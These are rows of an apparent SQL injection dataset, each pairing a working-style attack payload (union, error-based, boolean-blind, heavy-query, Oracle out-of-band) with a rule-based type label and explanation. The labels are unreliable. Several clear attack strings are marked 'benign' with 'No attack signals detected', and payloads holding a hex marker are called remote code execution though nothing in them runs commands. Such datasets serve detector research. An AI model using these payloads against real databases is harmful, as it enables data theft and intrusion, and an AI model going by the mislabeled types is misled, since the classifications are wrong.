row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
8202,"1"" ) ) ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( ( ""jmjr"" like ""jmjr",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
8203,1' and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and 'omlt' = 'omlt,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
8204,"-8159 where 2793 = 2793 union all select 2793,2793,2793,2793,2793#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
8205,"1 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null )",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
8206,"1 and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )",1,,error_based,generic,0.95,convert ( int detected — error_based injection (priority 4) on generic,rule-based
8207,-5880' ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( 'rwgl' = 'rwgl,1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
8208,"-6084' ) ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( 'dfcp' = 'dfcp",1,,error_based,generic,0.95,convert ( int detected — error_based injection (priority 4) on generic,rule-based
8209,1'|| ( select 'lvso' where 5675 = 5675,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
8210,"1%' ) union all select null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
8211,"1' ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( 'efwq' like 'efwq",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
8212,"-7008' ) ) union all select 9080,9080,9080#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
8213,-9509' ) where 9303 = 9303 order by 1#,1,,boolean_blind,generic,0.95,9303 = 9303 or detected — boolean_blind injection (priority 8) on generic,rule-based
8214,1' ) as lgex where 4068 = 4068 and 1378 = 9247--,1,,boolean_blind,generic,0.95,4068 = 4068 and detected — boolean_blind injection (priority 8) on generic,rule-based
8215,1 ) as zodp where 9112 = 9112,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
8216,"1"" ) ) as hzcq where 9250 = 9250 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --",1,,out_of_band,oracle,0.95,utl_inaddr detected — out_of_band injection (priority 2) on oracle,rule-based
8217,"1"" ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ""ureu"" like ""ureu",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
8218,"1%"" ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ""%"" = """,1,,heavy_query,generic,0.95,"generate_series (, select count ( * ) from generate_series ( 1,5000000 detected — heavy_query injection (priority 6) on generic",rule-based
8219,"-2745' ) or elt ( 1032 = 1032,3623 ) and ( 'vfxq' = 'vfxq",1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
